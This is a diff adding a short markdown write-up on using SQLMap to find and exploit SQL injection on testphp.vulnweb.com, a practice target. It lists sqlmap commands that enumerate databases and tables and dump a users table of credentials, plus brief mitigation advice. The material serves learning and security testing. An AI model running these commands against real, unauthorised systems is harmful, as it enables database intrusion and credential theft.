@@ -1,0 +1,23 @@
+# SQLMap - Automated SQL Injection  
+SQLMap is an automated tool used to detect and exploit SQL injection vulnerabilities.  
+
+## 🔹 How I Used SQLMap  
+I tested the login and artist pages of testphp.vulnweb.com for SQL Injection using:  
+bash
+sqlmap -u "http://testphp.vulnweb.com/artists.php?artist=1" --crawl=2 --batch
+
+✅ Findings:
+	•	Extracted the database name: acuart
+	•	Found a users table containing usernames and hashed passwords
+
+🔹 Useful SQLMap Commands
+	•	sqlmap -u "URL" --dbs → Enumerate database names
+	•	sqlmap -u "URL" -D acuart --tables → List all tables in acuart
+	•	sqlmap -u "URL" -D acuart -T users --dump → Extract all user credentials
+
+🔹 Mitigation Strategy
+
+Web applications should:
+✅ Use prepared statements to prevent SQL Injection
+✅ Implement web application firewalls (WAF)
+
